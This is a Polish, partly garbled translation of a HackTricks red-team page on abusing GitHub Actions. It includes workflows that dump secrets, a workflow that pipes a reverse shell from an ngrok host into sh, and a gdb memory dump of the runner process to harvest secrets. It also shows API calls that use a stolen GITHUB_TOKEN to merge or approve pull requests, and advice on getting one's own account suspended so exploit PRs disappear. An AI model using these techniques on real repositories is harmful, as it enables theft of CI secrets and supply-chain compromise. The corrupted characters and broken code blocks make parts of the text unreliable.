# Abusing Github Actions

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Podstawowe informacje

Na tej stronie znajdziesz:

* **Podsumowanie wszystkich skutk贸w**, gdy atakujcy uzyska dostp do akcji Github
* R贸偶ne sposoby **uzyskania dostpu do akcji**:
* Posiadanie **uprawnie** do tworzenia akcji
* Nadu偶ywanie wyzwalaczy zwizanych z **pull requestami**
* Nadu偶ywanie **innych technik zewntrznego dostpu**
* **Pivotowanie** z ju偶 skompromitowanego repozytorium
* Na koniec sekcja o **technikach post-eksploatacyjnych do nadu偶ycia akcji od wewntrz** (spowodowanie wspomnianych skutk贸w)

## Podsumowanie skutk贸w

Dla wprowadzenia do [**Akcji Github sprawd藕 podstawowe informacje**](../basic-github-information.md#github-actions).

W przypadku, gdy mo偶esz **wykonywa dowolne akcje Github/wstrzykiwa kod** w **repozytorium**, mo偶esz:

* **Ukradnij** **sekrety** z tego repozytorium/organizacji.
* Jeli mo偶esz tylko wstrzykn, mo偶esz ukra to, co ju偶 jest obecne w przepywie pracy.
* Nadu偶yj **uprawnienia repozytorium** do dostpu do innych platform, takich jak AWS i GCP.
* **Wykonaj kod w niestandardowych pracownikach** (jeli s u偶ywane niestandardowe pracowniki) i spr贸buj przej stamtd.
* **Nadpisz** kod repozytorium.
* To zale偶y od uprawnie `GITHUB_TOKEN` (jeli takie s).
* **Zniewa偶** **wdro偶enia** i inne **artyfakty**.
* Jeli kod jest wdra偶any lub przechowuje co, mo偶esz to zmodyfikowa i uzyska dalszy dostp.

## GITHUB\_TOKEN

Ten "**sekret**" (pochodzcy z `${{ secrets.GITHUB_TOKEN }}` i `${{ github.token }}`) jest udzielany, gdy administrator wcza t opcj:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Ten token jest taki sam, jakiego u偶yje **Aplikacja Github**, wic mo偶e uzyska dostp do tych samych punkt贸w kocowych: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github powinien wyda [**przepyw**](https://github.com/github/roadmap/issues/74), kt贸ry **umo偶liwia dostp midzy repozytoriami** w GitHubie, dziki czemu repozytorium mo偶e uzyska dostp do innych wewntrznych repozytori贸w za pomoc `GITHUB_TOKEN`.
{% endhint %}

Mo偶esz zobaczy mo偶liwe **uprawnienia** tego tokenu w: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Zauwa偶, 偶e token **wygasa po zakoczeniu zadania**.\
Te tokeny wygldaj tak: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Kilka interesujcych rzeczy, kt贸re mo偶esz zrobi z tym tokenem:

{% tabs %}
{% tab title="Scal PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Zatwierd藕 PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Utw贸rz PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Zauwa偶, 偶e w kilku przypadkach mo偶esz znale藕 **tokeny u偶ytkownika GitHub w zmiennych rodowiskowych GitHub Actions lub w sekretach**. Te tokeny mog da Ci wiksze uprawnienia w repozytorium i organizacji.
{% endhint %}

<details>

<summary>Wywietl list sekret贸w w wynikach dziaania GitHub</summary>

\`\`\`yaml name: list\_env on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: List\_env: runs-on: ubuntu-latest steps: - name: List Env # Need to base64 encode or github will change the secret value for "\*\*\*" run: sh -c 'env | grep "secret\_" | base64 -w0' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}} secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}} \`\`\`

</details>

<details>

<summary>Uzyskaj odwrotn powok za pomoc sekret贸w</summary>

\`\`\`yaml name: revshell on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: create\_pull\_request: runs-on: ubuntu-latest steps: - name: Get Rev Shell run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}} secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}} \`\`\`

</details>

Mo偶liwe jest sprawdzenie uprawnie udzielonych dla Tokena Github w repozytoriach innych u偶ytkownik贸w **sprawdzajc logi** dziaa:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozwolone Wykonanie

{% hint style="info" %}
To byby najatwiejszy spos贸b na skompromitowanie dziaa Github, poniewa偶 w tym przypadku zakada si, 偶e masz dostp do **utworzenia nowego repozytorium w organizacji**, lub masz **uprawnienia do zapisu w repozytorium**.

Jeli jeste w takim scenariuszu, mo偶esz po prostu sprawdzi [techniki post-eksploatacyjne](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Wykonanie poprzez Utworzenie Repozytorium

W przypadku gdy czonkowie organizacji mog **tworzy nowe repozytoria** i mo偶esz wykonywa dziaania github, mo偶esz **utworzy nowe repozytorium i ukra tajne informacje ustawione na poziomie organizacji**.

### Wykonanie z Nowej Gazi

Jeli mo偶esz **utworzy now ga藕 w repozytorium, kt贸re ju偶 zawiera skonfigurowane dziaanie Github Action**, mo偶esz je **zmodyfikowa**, **przesa** zawarto, a nastpnie **wykona to dziaanie z nowej gazi**. W ten spos贸b mo偶esz **wydoby tajne informacje na poziomie repozytorium i organizacji** (ale musisz wiedzie, jak s one nazwane).

Mo偶esz sprawi, 偶e zmodyfikowane dziaanie bdzie wykonywalne **rcznie**, gdy zostanie **utworzone PR** lub gdy **jaki kod zostanie przesany** (w zale偶noci od tego, jak bardzo chcesz by uci偶liwy):

```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```

***

## Wykonanie rozgazione

{% hint style="info" %}
Istniej r贸偶ne wyzwalacze, kt贸re mog umo偶liwi atakujcemu **wykonanie akcji Github z innego repozytorium**. Jeli te akcje wyzwalajce s 藕le skonfigurowane, atakujcy mo偶e je skompromitowa.
{% endhint %}

### `pull_request`

Wyzwalacz workflow **`pull_request`** uruchomi workflow za ka偶dym razem, gdy zostanie otrzymany pull request, z pewnymi wyjtkami: domylnie, jeli to jest **pierwszy raz**, gdy **wsp贸pracujesz**, jaki **opiekun** bdzie musia **zatwierdzi** **uruchomienie** workflow:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Poniewa偶 **domylne ograniczenie** dotyczy **nowych** wsp贸pracownik贸w, mo偶esz przyczyni si do **naprawy wa偶nego bdu/pomyki** i nastpnie wysa **inne PR-y, aby nadu偶y nowych uprawnie `pull_request`**.

**Przetestowaem to i nie dziaa**: ~~Inn opcj byoby utworzenie konta o nazwie osoby, kt贸ra przyczynia si do projektu i usuna swoje konto.~~
{% endhint %}

Co wicej, domylnie **zapobiega dostpowi do zapisu** i **tajemnic** w repozytorium docelowym, jak wspomniano w [**dokumentacji**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Z wyjtkiem `GITHUB_TOKEN`, **tajemnice nie s przekazywane do wykonawcy** podczas uruchamiania workflow z **rozgazionego** repozytorium. **`GITHUB_TOKEN` ma uprawnienia tylko do odczytu** w pull requestach **z rozgazionych repozytori贸w**.

Atakujcy m贸gby zmodyfikowa definicj akcji Github w celu wykonania dowolnych dziaa i doczenia arbitralnych akcji. Niemniej jednak nie bdzie m贸g ukra tajemnic ani nadpisa repozytorium ze wzgldu na wspomniane ograniczenia.

{% hint style="danger" %}
**Tak, jeli atakujcy zmieni w PR akcj Github, kt贸ra zostanie wywoana, jego akcja Github bdzie u偶ywana, a nie ta z repozytorium 藕r贸dowego!**
{% endhint %}

Poniewa偶 atakujcy kontroluje r贸wnie偶 kod, kt贸ry jest wykonywany, nawet jeli nie ma tajemnic ani uprawnie do zapisu na `GITHUB_TOKEN`, atakujcy m贸gby na przykad **przesa zoliwe artefakty**.

### **`pull_request_target`**

Wyzwalacz workflow **`pull_request_target`** ma **uprawnienia do zapisu** w repozytorium docelowym i **dostp do tajemnic** (i nie prosi o zgod).

Zauwa偶, 偶e wyzwalacz workflow **`pull_request_target`** **uruchamia si w kontekcie bazowym** a nie w tym podanym przez PR (aby **nie wykonywa niezaufanego kodu**). Aby uzyska wicej informacji na temat `pull_request_target` [**sprawd藕 dokumentacj**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Ponadto, aby uzyska wicej informacji na temat tego konkretnego niebezpiecznego u偶ycia, sprawd藕 ten [**post na blogu Githuba**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Mo偶e si wydawa, 偶e poniewa偶 **wykonywane workflow** jest zdefiniowane w **bazie**, a nie w PR, jest **bezpieczne** korzystanie z **`pull_request_target`**, ale istniej **przypadki, w kt贸rych nie jest**.

A ten bdzie mia **dostp do tajemnic**.

### `workflow_run`

Wyzwalacz [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) pozwala uruchomi workflow z innego, gdy jest on `completed`, `requested` lub `in_progress`.

W tym przykadzie workflow jest skonfigurowane do uruchomienia po zakoczeniu oddzielnego workflow "Run Tests":

```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```

Ponadto, zgodnie z dokumentacj: Przepyw rozpoczty przez zdarzenie `workflow_run` ma **dostp do tajemnic i mo偶liwo zapisywania token贸w, nawet jeli poprzedni przepyw tego nie robi**.

Tego rodzaju przepyw mo偶e by zaatakowany, jeli **zale偶y** on od **przepywu**, kt贸ry mo偶e zosta **uruchomiony** przez zewntrznego u偶ytkownika za porednictwem **`pull_request`** lub **`pull_request_target`**. Kilka przykad贸w podatnych przypadk贸w mo偶na znale藕 w [**tym blogu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Pierwszy polega na tym, 偶e przepyw uruchomiony przez zdarzenie **`workflow_run`** pobiera kod atakujcego: `${{ github.event.pull_request.head.sha }}`\
Drugi polega na **przekazywaniu** artefaktu z **niezaufanego** kodu do przepywu **`workflow_run`** i wykorzystywaniu zawartoci tego artefaktu w spos贸b, kt贸ry czyni go **podatnym na RCE**.

### `workflow_call`

TODO

TODO: Sprawd藕, czy podczas wykonywania z `pull\_request` u偶yty/pobrany kod pochodzi z oryginau czy z forka PR

## Nadu偶ycie wykonania z forka

Wymienilimy wszystkie sposoby, w jakie zewntrzny atakujcy m贸gby zmusi przepyw github do wykonania, teraz przyjrzyjmy si, jak te wykonania, jeli s 藕le skonfigurowane, mog by wykorzystane:

### Wykonanie niezaufanego checkout

W przypadku **`pull_request`,** przepyw zostanie wykonany w **kontekcie PR** (wic wykonany zostanie **zoliwy kod PR**), ale kto musi go **autoryzowa najpierw** i bdzie dziaa z pewnymi [ograniczeniami](./#pull\_request).

W przypadku przepywu korzystajcego z **`pull_request_target` lub `workflow_run`**, kt贸ry zale偶y od przepywu, kt贸ry mo偶e by uruchomiony z **`pull_request_target` lub `pull_request`**, kod z oryginalnego repozytorium zostanie wykonany, wic **atakujcy nie mo偶e kontrolowa wykonanego kodu**.

{% hint style="danger" %}
Jednak jeli **akcja** ma **wyra藕ne sprawdzenie PR**, kt贸re **pobierze kod z PR** (a nie z bazy), zostanie u偶yty kod kontrolowany przez atakujcego. Na przykad (sprawd藕 lini 12, gdzie kod PR jest pobierany):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># NIEBEZPIECZNE. Przedstawione tylko jako przykad.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencjalnie **niezaufany kod jest uruchamiany podczas `npm install` lub `npm build`** poniewa偶 skrypty budowania i u偶ywane **pakiety s kontrolowane przez autora PR**.

{% hint style="warning" %}
Dork githubowy do wyszukiwania podatnych akcji to: `event.pull_request pull_request_target extension:yml` jednak istniej r贸偶ne sposoby konfigurowania zada do bezpiecznego wykonania, nawet jeli akcja jest skonfigurowana w spos贸b niebezpieczny (np. u偶ywajc warunk贸w dotyczcych tego, kto jest aktorem generujcym PR).
{% endhint %}

### Wstrzykiwanie Skrypt贸w Kontekstu <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Zauwa偶, 偶e istniej pewne [**konteksty githubowe**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context), kt贸rych wartoci s **kontrolowane** przez **u偶ytkownika** tworzcego PR. Jeli akcja githuba u偶ywa tych **danych do wykonania czegokolwiek**, mo偶e to prowadzi do **wykonania arbitralnego kodu:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Wstrzykiwanie Skrypt贸w GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Z dokumentacji: Mo偶esz udostpni **zmienn rodowiskow** do wszystkich kolejnych krok贸w w zadaniu przepywu, definiujc lub aktualizujc zmienn rodowiskow i zapisujc j do pliku rodowiskowego **`GITHUB_ENV`**.

Jeli atakujcy m贸gby **wstrzykn jakkolwiek warto** do tej **zmiennej rodowiskowej**, m贸gby wstrzykn zmienne rodowiskowe, kt贸re mogyby wykona kod w nastpnych krokach, takie jak **LD\_PRELOAD** lub **NODE\_OPTIONS**.

Na przykad ([**to**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**to**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), wyobra藕 sobie przepyw, kt贸ry ufa przesanemu artefaktowi, aby przechowa jego zawarto w zmiennej rodowiskowej **`GITHUB_ENV`**. Atakujcy m贸gby przesa co takiego, aby go skompromitowa:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### Podatne Akcje Githuba od Firm Trzecich

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Jak wspomniano w [**tym wpisie na blogu**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ta Akcja Githuba pozwala na dostp do artefakt贸w z r贸偶nych przepyw贸w i nawet repozytori贸w.

Problem polega na tym, 偶e jeli parametr **`path`** nie jest ustawiony, artefakt jest wypakowywany w bie偶cym katalogu i mo偶e nadpisa pliki, kt贸re mog by p贸藕niej u偶ywane lub nawet wykonane w przepywie. Dlatego, jeli Artefakt jest podatny, atakujcy m贸gby wykorzysta to do skompromitowania innych przepyw贸w ufajcych Artefaktowi.

Przykad podatnego przepywu:

```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```

To mo偶na zaatakowa za pomoc tego workflow:

```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```

***

## Inne zewntrzne dostpy

### Przechwytywanie repozytorium z usunitym przestrzeni nazw

Jeli konto zmieni swoj nazw, inny u偶ytkownik mo偶e zarejestrowa konto o tej samej nazwie po pewnym czasie. Jeli repozytorium miao **mniej ni偶 100 gwiazdek przed zmian nazwy**, Github pozwoli nowo zarejestrowanemu u偶ytkownikowi o tej samej nazwie utworzy **repozytorium o tej samej nazwie** jak to usunite.

{% hint style="danger" %}
Jeli dziaanie korzysta z repozytorium nieistniejcego konta, nadal istnieje mo偶liwo, 偶e atakujcy mo偶e utworzy to konto i naruszy dziaanie.
{% endhint %}

Jeli inne repozytoria korzystay z **zale偶noci z repozytori贸w tego u偶ytkownika**, atakujcy bdzie m贸g je przej. Tutaj znajdziesz bardziej kompletn wyjanienie: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Przeczanie repozytori贸w

{% hint style="info" %}
W tej sekcji om贸wimy techniki, kt贸re umo偶liwi **przeczenie si z jednego repozytorium na inne**, zakadajc, 偶e mamy pewien rodzaj dostpu do pierwszego (sprawd藕 poprzedni sekcj).
{% endhint %}

### Zatrucie pamici podrcznej

Pami podrczna jest utrzymywana midzy **uruchomieniami przepywu pracy w tej samej gazi**. Oznacza to, 偶e jeli atakujcy **naruszy** **pakiet**, kt贸ry jest nastpnie przechowywany w pamici podrcznej i **pobrany** oraz wykonany przez **bardziej uprzywilejowany** przepyw pracy, bdzie m贸g r贸wnie偶 **naruszy** ten przepyw pracy.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Zatrucie artefakt贸w

Przepywy pracy mog korzysta z **artefakt贸w z innych przepyw贸w pracy i nawet repozytori贸w**, jeli atakujcy zdoa **naruszy** dziaanie Github Action, kt贸ry **przesya artefakt**, kt贸ry p贸藕niej jest u偶ywany przez inny przepyw pracy, mo偶e **naruszy inne przepywy pracy**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Po wykorzystaniu z dziaania

### Dostp do AWS i GCP za pomoc OIDC

Sprawd藕 nastpujce strony:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Dostp do sekret贸w <a href="#accessing-secrets" id="accessing-secrets"></a>

Jeli wstrzykujesz zawarto do skryptu, warto wiedzie, jak uzyska dostp do sekret贸w:

* Jeli sekret lub token jest ustawiony jako **zmienna rodowiskowa**, mo偶na go bezporednio uzyska przez rodowisko za pomoc **`printenv`**.

<details>

<summary>Wywietl sekrety w wyniku dziaania Github Action</summary>

\`\`\`yaml name: list\_env on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: List\_env: runs-on: ubuntu-latest steps: - name: List Env # Need to base64 encode or github will change the secret value for "\*\*\*" run: sh -c 'env | grep "secret\_" | base64 -w0' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}}

secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}}

````
</details>

<details>

<summary>Uzyskaj odwrotn powok za pomoc sekret贸w</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
````

</details>

* Jeli sekret jest u偶ywany **bezporednio w wyra偶eniu**, wygenerowany skrypt powoki jest przechowywany **na dysku** i jest dostpny.
* ```bash
  ```

cat /home/runner/work/\_temp/\*

````
* Dla dziaa w jzyku JavaScript sekrety s przesyane za pomoc zmiennych rodowiskowych
* ```bash
ps axe | grep node
````

* Dla **niestandardowej akcji**, ryzyko mo偶e si r贸偶ni w zale偶noci od tego, w jaki spos贸b program wykorzystuje sekret uzyskany z **argumentu**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Nadu偶ywanie wasnych maszyn

Spos贸b na znalezienie, kt贸re **dziaania Github Actions s wykonywane w infrastrukturze spoza Githuba**, to wyszukiwanie **`runs-on: self-hosted`** w konfiguracji dziaania Github Action yaml.

Maszyny **wasne** mog mie dostp do **bardziej wra偶liwych informacji**, do innych **system贸w sieciowych** (nara偶onych punkt贸w kocowych w sieci? usugi metadanych?) lub, nawet jeli jest izolowana i zniszczona, **mo偶e by uruchomionych wicej ni偶 jedno dziaanie jednoczenie**, a zoliwe dziaanie mo偶e **ukra sekrety** z innego.

Na maszynach wasnych mo偶na r贸wnie偶 uzyska **sekrety z procesu \_Runner.Listener**, kt贸ry bdzie zawiera wszystkie sekrety przepyw贸w pracy na dowolnym etapie poprzez zrzucenie jego pamici:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Sprawd藕 [**ten post po wicej informacji**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Rejestr obraz贸w Docker w Github

Mo偶liwe jest stworzenie dziaa Github, kt贸re bd **budowa i przechowywa obraz Docker w Github**.\
Przykad mo偶na znale藕 w poni偶szym rozkadzie:

<details>

<summary>Akcja Github Build &#x26; Push obrazu Docker</summary>

\`\`\`yaml \[...]

* name: Set up Docker Buildx uses: docker/setup-buildx-action@v1
* name: Login to GitHub Container Registry uses: docker/login-action@v1 with: registry: ghcr.io username: $\{{ github.repository\_owner \}} password: $\{{ secrets.ACTIONS\_TOKEN \}}
* name: Add Github Token to Dockerfile to be able to download code run: | sed -i -e 's/TOKEN=##VALUE##/TOKEN=$\{{ secrets.ACTIONS\_TOKEN \}}/g' Dockerfile
* name: Build and push uses: docker/build-push-action@v2 with: context: . push: true tags: | ghcr.io/$\{{ github.repository\_owner \}}/$\{{ github.event.repository.name \}}:latest ghcr.io/$\{{ github.repository\_owner \}}/$\{{ github.event.repository.name \}}:$\{{ env.GITHUB\_NEWXREF \}}-$\{{ github.sha \}}

\[...]

````
</details>

Jak mo偶na zauwa偶y w poprzednim kodzie, rejestr Github jest hostowany w **`ghcr.io`**.

U偶ytkownik z uprawnieniami do odczytu repozytorium bdzie w stanie pobra obraz Dockera, u偶ywajc tokena dostpu osobistego:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
````

Nastpnie u偶ytkownik m贸gby wyszuka **wycieki sekret贸w w warstwach obrazu Docker:**

#### Wra偶liwe informacje w logach Github Actions

Nawet jeli **Github** pr贸buje **wykry wartoci sekretne** w logach dziaa i **unika ich pokazywania**, **inne wra偶liwe dane**, kt贸re mogy zosta wygenerowane podczas wykonywania dziaania, nie zostan ukryte. Na przykad JWT podpisany wartoci sekretn nie zostanie ukryty, chyba 偶e zostanie to [specjalnie skonfigurowane](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

### Zakrywanie swoich lad贸w

(Technika z [**tutaj**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Po pierwsze, ka偶de PR podniesione jest jasno widoczne publicznie w Github i dla docelowego konta GitHub. W GitHub domylnie **nie mo偶emy usun PR z internetu**, ale jest haczyk. Dla kont GitHub, kt贸re s **zawieszone** przez GitHub, wszystkie ich **PR s automatycznie usuwane** i usunite z internetu. Wic aby ukry swoj aktywno, musisz albo zawiesi swoje **konto GitHub albo oznaczy swoje konto**. Spowoduje to, 偶e **wszystkie twoje dziaania** na GitHubie zostan ukryte przed internetem (w zasadzie usunite zostan wszystkie twoje PR z exploitami)

Organizacja w GitHub jest bardzo aktywna w zgaszaniu kont do GitHub. Wystarczy udostpni "jakie rzeczy" w Issue, a oni upewni si, 偶e twoje konto zostanie zawieszone w cigu 12 godzin :p i oto masz, zrobie swoje exploit niewidocznym na github.

Jedynym sposobem dla organizacji, aby dowiedzie si, 偶e zostay zaatakowane, jest sprawdzenie log贸w GitHub z SIEM, poniewa偶 z interfejsu GitHub PR zostanie usunity.

### Narzdzia

Nastpujce narzdzia s przydatne do znajdowania przepyw贸w pracy Github Actions i nawet znajdowania podatnych:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

</details>
